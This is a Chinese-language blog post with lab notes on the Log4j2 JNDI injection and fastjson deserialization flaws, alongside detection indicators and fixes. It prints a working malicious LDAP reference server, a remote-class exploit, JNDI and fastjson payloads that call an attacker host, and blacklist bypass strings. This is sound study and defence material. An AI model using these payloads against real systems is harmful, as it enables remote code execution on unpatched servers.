<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">public class LDAPRefServer &#123;</span><br><span class="line"></span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * class地址 用#Exploit代替Exploit.class</span><br><span class="line">     */</span><br><span class="line">    private static final String EXPLOIT_CLASS_URL = &quot;http://192.168.142.66:80/#Exploit&quot;;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int port = 7912;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;,</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL)));</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line"></span><br><span class="line">        private URL codebase;</span><br><span class="line">        public OperationInterceptor(URL cb) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void processSearchResult(InMemoryInterceptedSearchResult result) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125; catch (Exception e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;Calc&quot;);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class="line">            if (refPos &gt; 0) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class="line">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$</span><br><span class="line">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>漏洞原理分析</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126142622854.png" alt="image-20221126142622854"></p>
<p>payload:</p>
<p>logger.error(&quot;${jndi:ldap://wuya.com:5678/test}&quot;);</p>
<p>1. 首先攻击者控制远程 http 服务器和 ldap 目录服务，http 服务器上存在恶意静态方法，LDAP 目录服务上？</p>
<p>2. 攻击者通过一些方法传入我们的 payload</p>
<p>由于 java 中 {} 可以解析变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    private static  final  Logger logger = LogManager.getLogger();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String content = &quot;world&quot;;</span><br><span class="line">        logger.trace(&quot;hello &#123;&#125;&quot;,content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    private static  final  Logger logger = LogManager.getLogger();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String content = &quot;world&quot;;</span><br><span class="line">        logger.trace(&quot;hello &#123;&#125;&quot;,content);</span><br><span class="line"></span><br><span class="line">        //https://logging.apache.org/log4j/2.x/manual/lookups.html</span><br><span class="line">        String content2 = &quot;$&#123;java:os&#125;&quot;;</span><br><span class="line">        logger.trace(&quot;hello &#123;&#125;&quot;,content2);</span><br><span class="line">        String content3 = &quot;$&#123;java:vm&#125;&quot;;</span><br><span class="line">        logger.trace(&quot;hello &#123;&#125;&quot;,content3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进一步解析 {}，发现是 JNDI 扩展内容。</p>
<p>再进一步解析，发现了是 LDAP 协议，LDAP 服务器在 127.0.0.1，要查找的 key 是 exploit。</p>
<p>最后，调用具体负责 LDAP 的模块去请求对应的数据。</p>
<p>3。从指定动态地址下载对象。由于 ldap 目录中不存在 Exploit 类，因此会向远程 http 服务器请求</p>
<p>通过命令引用可以远程下载一个 class 文件，然后下载后加载起来构建对象。</p>
<p>由于代码在 NamingManager.java 中创建实例，导致静态方法自动执行，如果远程下载的文件中有恶意代码，也会自动执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@SuppressWarnings(&quot;deprecation&quot;) // Class.newInstance</span><br><span class="line">ObjectFactory result = (clas != null) ? (ObjectFactory) clas.newInstance() : null;</span><br><span class="line">return result;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>影响版本</p>
<p>1、使用了 log4j 的组件，并且版本在 2.x &lt;= 2.14.1</p>
<p>2、JDK 版本小于 8u191、7u201、6u211</p>
<p>资产排查</p>
<p>1、pom 版本检查</p>
<p>2、可以通过检查日志中是否存在 “jndi:ldap://” 、“jndi:rmi” 、 “<span class="exturl" data-url="aHR0cDovL2Ruc2xvZy5jbg==">dnslog.cn</span>” 等字符来发现可能的攻击行为。</p>
<p>3、检查日志中是否存在相关堆栈报错，堆栈里是否有 JndiLookup、ldapURLContext、getObjectFactoryFromReference 等与 jndi 调用相关的堆栈信息</p>
<p>修复思路</p>
<p>1、禁止用户请求参数出现攻击关键字</p>
<p>2、禁止 lookup 下载远程文件（命名引用）</p>
<p>3、禁止 Log4j 的应用连接外网</p>
<p>4、禁止 Log4j 使用 lookup</p>
<p>5、从 Log4j jar 包中中删除 lookup 2.10 以下</p>
<p>1、将 Log4j 框架升级到 2.17.1 版本</p>
<p>2、使用安全产品防护：WAF、RASP……</p>
<p>临时方案</p>
<p>1、升级 JDK</p>
<p>2、修改 Log4j 配置</p>
<p>3、删除 JndiLookup.class</p>
<p>1、设置参数：</p>
<p>log4j2.formatMsgNoLookups=True</p>
<p>2、修改 JVM 参数：</p>
<p>-Dlog4j2.formatMsgNoLookups=true</p>
<p>3、系统环境变量：</p>
<p>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true</p>
<p>4、禁止使用了 Log4j2 的应用所在服务器外连</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzODQyMDkzL2FydGljbGUvZGV0YWlscy8xMjIwNzQwMjA=">(70 条消息) log4j2 漏洞_Archie_java 的博客 - CSDN 博客_log4j2 漏洞</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDkyMC5odG1s">浅谈 Log4j2 漏洞 | NOSEC 安全讯息平台 - 白帽汇安全研究院</span></p>
<h3 id="fastjson-反序列化"><a class="markdownIt-Anchor" href="#fastjson-反序列化">#</a> fastjson 反序列化</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvZmFzdGpzb24vd2lraS9RdWljay1TdGFydC1DTg==">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</span> 1.2.76</p>
<p>l 速度快</p>
<p>l 使用广泛</p>
<p>l 测试完备</p>
<p>l 使用简单</p>
<p>l 功能完备</p>
<p><strong>序列化的时候，会调用成员变量的 get 方法，私有成员变量不会被序列化。</strong></p>
<p><strong>反序列化的时候，会调用成员变量的类的构造方法，set 方法，public 修饰的成员全部自动赋值。</strong></p>
<p>反序列化代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject() 返回实际类型对象,显示指定对象</span><br><span class="line">User user1 = JSON.parseObject(serializedStr, User.class);</span><br><span class="line">JSON.parse() 返回JsonObject对象，需要强制类型转换</span><br><span class="line">Object obj1 =JSON.parse(serializedStr);</span><br></pre></td></tr></table></figure>
<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 从1.2.25开始，autotype默认关闭</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 序列化字符</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">serializedStr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.wuya.test.User\&quot;,\&quot;name\&quot;:\&quot;wuya\&quot;,\&quot;age\&quot;:66, \&quot;flag\&quot;: true,\&quot;sex\&quot;:\&quot;boy\&quot;,\&quot;address\&quot;:\&quot;china\&quot;&#125;&quot;</span>;<span class="comment">//</span></span><br><span class="line">        System.out.println(<span class="string">&quot;serializedStr=&quot;</span> + serializedStr);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------\n\n&quot;</span>);</span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject]</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse(serializedStr)：&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj1</span> <span class="operator">=</span>JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;parse反序列化对象名称:&quot;</span> + obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;parse反序列化：&quot;</span> + obj1);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(serializedStr)：&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject反序列化对象名称:&quot;</span> + obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject反序列化:&quot;</span> + obj2);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过parseObject,指定为object.class</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(serializedStr, Object.class)：&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> JSON.parseObject(serializedStr, Object.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject反序列化对象名称:&quot;</span> + obj3.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject反序列化:&quot;</span> + obj3);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过parseObject,指定为User.class</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(serializedStr, User.class)：&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj4</span> <span class="operator">=</span> JSON.parseObject(serializedStr, User.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject反序列化对象名称:&quot;</span> + obj4.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject反序列化:&quot;</span> + obj4);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSON.parse(serializedStr)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setAge</span><br><span class="line">call User setFlag</span><br><span class="line">parse反序列化对象名称:com.wuya.test.User</span><br><span class="line">parse反序列化：User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">JSON.parseObject(serializedStr)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setAge</span><br><span class="line">call User setFlag</span><br><span class="line">call User getAge</span><br><span class="line">call User isFlag</span><br><span class="line">call User getName</span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;wuya&quot;,&quot;age&quot;:66&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">JSON.parseObject(serializedStr, Object.class)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setAge</span><br><span class="line">call User setFlag</span><br><span class="line">parseObject反序列化对象名称:com.wuya.test.User</span><br><span class="line">parseObject反序列化:User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">JSON.parseObject(serializedStr, User.class)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setAge</span><br><span class="line">call User setFlag</span><br><span class="line">parseObject反序列化对象名称:com.wuya.test.User</span><br><span class="line">parseObject反序列化:User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>@ type 自省</p>
<p>我们可以发现，在反序列化是没有类名的，可以通过自省传入类名。</p>
<p>但不包含类名的问题是，当子类中包含接口或抽象类的时候，类型丢失</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.wuya.test.User&quot;,&quot;age&quot;:33,&quot;flag&quot;:false,&quot;name&quot;:&quot;wuya&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>利用自省功能传入恶意类实现攻击</p>
<p>这个 JSON 反序列化接口处，我们传入恶意的 JSON，就可以调用任意类的构造方法以及属性相关的 get，set 方法。 如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意 JSON 达到 RCE 的作用。</p>
<p>利用类</p>
<p>com.sun.rowset.JdbcRowSetImpl</p>
<p>dataSourceName 支持传入一个 rmi 的源，可以实现 JNDI 注入攻击</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122144731132.png" alt="image-20221122144731132"></p>
<h4 id="1214-cnvd-2017-02833"><a class="markdownIt-Anchor" href="#1214-cnvd-2017-02833">#</a> 1.2.14 CNVD-2017-02833</h4>
<p>复现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、vulhub启动靶场</span><br><span class="line">2、Kali 用marshalsec启动LDAP/RMI服务</span><br><span class="line">3、Kali 用python启动HTTP服务，存放恶意类</span><br><span class="line">4、Kali 用netcat监听端口，建立反弹连接</span><br></pre></td></tr></table></figure>
<p>切换 python 版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">配置</span><br><span class="line">update-alternatives --install /usr/bin/python</span><br><span class="line">python /usr/bin/python2 100</span><br><span class="line">update-alternatives --install /usr/bin/python</span><br><span class="line">python /usr/bin/python3 150</span><br><span class="line">切换版本</span><br><span class="line">update-alternatives --config python</span><br></pre></td></tr></table></figure>
<p>配置 jre 版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">export</span><br><span class="line">JAVA_HOME=/usr/local/soft/java/jdk1.8.0_74</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export</span><br><span class="line">CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HO</span><br><span class="line">ME/lib/tools.jar</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
<p>攻击:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">编写恶意代码LinuxTouch，编译为class</span><br><span class="line">python -m http.server 8089 #python3</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.142.132:8089/#LinuxTouch&quot; 9473</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.142.128:8090</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 146</span><br><span class="line">&#123; &quot;b&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi://192.168.142.132:9473/LinuxTouch&quot;, &quot;autoCommit&quot;: true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原理:</p>
<p><strong>1.JdbcRowSetImpl</strong></p>
<p>payload 中反序列化时传入了 dataSourceName 和 autoCommit</p>
<p>那么按照上面的反序列化过程一定会调用 setDataSourceName 和 setautoCommit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void setDataSourceName(String dsName) throws SQLException&#123;</span><br><span class="line"></span><br><span class="line">       if(getDataSourceName() != null) &#123;</span><br><span class="line">          if(!getDataSourceName().equals(dsName)) &#123;</span><br><span class="line">             super.setDataSourceName(dsName);</span><br><span class="line">             conn = null;</span><br><span class="line">             ps = null;</span><br><span class="line">             rs = null;</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       else &#123;</span><br><span class="line">          super.setDataSourceName(dsName);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>setautoCommit</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122153207492.png" alt="image-20221122153207492"></p>
<p>setautoCommit 调用 connect ()，connect () 会对 dataSourceName 属性进行一个 InitialContext.lookup (dataSourceName), 从而实现 JNDI 注入。找到恶意服务器上下载代码并执行</p>
<p>修复</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">默认不使用autotype</span><br><span class="line">com.sun.rowset.jdbcRowSetlmpl被加入了黑名单</span><br></pre></td></tr></table></figure>
<p>bypass 1</p>
<p>所以在 autotypesupport 开启时，我们可以构造如下 payload 来 bypass</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:1099&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
<p>“至于为什么会有这种奇怪的处理，L 和；这一对字符其实是 JVM 字节码中用来表示类名的：”</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.<span class="title function_">startsWith</span>(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.<span class="title function_">endsWith</span>(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="title class_">String</span> newClassName = className.<span class="title function_">substring</span>(<span class="number">1</span>, className.<span class="title function_">length</span>() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">loadClass</span>(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>bypass2</p>
<p>双写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:2357/Command8&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="1247-cnvd-2017-22238"><a class="markdownIt-Anchor" href="#1247-cnvd-2017-22238">#</a> 1.2.47 CNVD-2017-22238</h4>
<p>通过反弹连接的方式</p>
